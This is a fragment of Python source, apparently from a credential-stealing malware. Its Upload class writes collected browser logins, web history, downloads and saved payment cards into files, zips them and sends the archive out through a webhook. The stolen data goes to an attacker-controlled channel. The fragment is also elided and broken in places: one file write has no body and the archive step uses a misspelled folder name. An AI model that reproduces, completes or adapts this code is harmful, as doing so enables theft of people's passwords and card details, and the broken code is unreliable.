...
class Upload:
    ...
    def write_files(self):
        ...
        if __LOGINS__:
            with open("Data\\logins.txt", "w", encoding="utf-8") as f:
        ...
        if __WEB_HISTORY__:
            with open("Data\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("Data\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("Data\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("Data.zip", "w") as zip:
            for file in os.listdir("Datat"):
                zip.write(f"Data\\{file}", file)

    def send(self):
        self.webhook.send(
            embed=Embed(
                title="Data",
                description="```" + '\n'.join(self.tree(Path("Data"))) + "```",
            ),
            file=File("Data.zip"),
        )
